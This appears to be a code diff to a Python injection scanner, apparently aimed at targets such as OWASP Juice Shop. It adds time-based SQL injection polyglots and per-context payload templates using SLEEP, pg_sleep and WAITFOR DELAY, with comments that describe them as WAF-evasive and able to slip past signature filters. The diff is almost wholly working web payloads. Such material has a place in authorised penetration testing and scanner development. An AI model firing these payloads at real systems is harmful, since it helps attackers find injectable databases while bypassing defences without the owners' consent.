@@ -93,6 +93,36 @@ BOOLEAN_AND_PAIRS = [
     ('" AND "1"="1', '" AND "1"="2'),
 ]
 
+# Time-based POLYGLOTS: a single value that triggers the delay regardless of
+# whether the input lands in a numeric, single-quote, or double-quote context.
+# The `/* ... */` wrapper makes the unused branches inert. One request covers
+# all three contexts, so these are tried first (efficient + WAF-evasive). Each
+# is REPLACED as the whole value (they break out of context themselves), and
+# {s} is the delay in seconds (control uses {s}=0). Only ONE embedded sleep
+# actually executes per context, so the delay is ~{s}s, not a multiple.
+TIME_BASED_POLYGLOTS = [
+    # MySQL / MariaDB / SQLite (SLEEP) — the classic detection polyglot.
+    "SLEEP({s})/*' or SLEEP({s}) or '\" or SLEEP({s}) or \"*/",
+    # XOR form — evades naive ' or sleep' signature filters.
+    "SLEEP({s})/*'XOR(SLEEP({s}))OR'\"XOR(SLEEP({s}))OR\"*/",
+    # PostgreSQL (pg_sleep).
+    "pg_sleep({s})/*' or pg_sleep({s}) or '\" or pg_sleep({s}) or \"*/",
+]
+
+# Per-context time-based payloads (APPENDED to the original value) — fallback
+# after the polyglots for engines/contexts the polyglot doesn't cover (MSSQL
+# WAITFOR, stacked pg_sleep, etc.).
+TIME_BASED_TEMPLATES = [
+    "' OR SLEEP({s})-- -",
+    " OR SLEEP({s})-- -",
+    "' AND SLEEP({s})-- -",
+    "'||pg_sleep({s})-- -",
+    "';SELECT pg_sleep({s})-- -",
+    "';WAITFOR DELAY '0:0:{s}'-- -",
+    "');WAITFOR DELAY '0:0:{s}'-- -",
+    "' AND (SELECT {s} FROM (SELECT(SLEEP({s})))a)-- -",
+]
+
 # NoSQL injection — boolean true/false pairs. A "true" payload should return
 # data (match), the "false" should return none. Covers MongoDB/MarsDB (Juice
 # Shop uses MarsDB for order tracking), which sqlmap does not test.
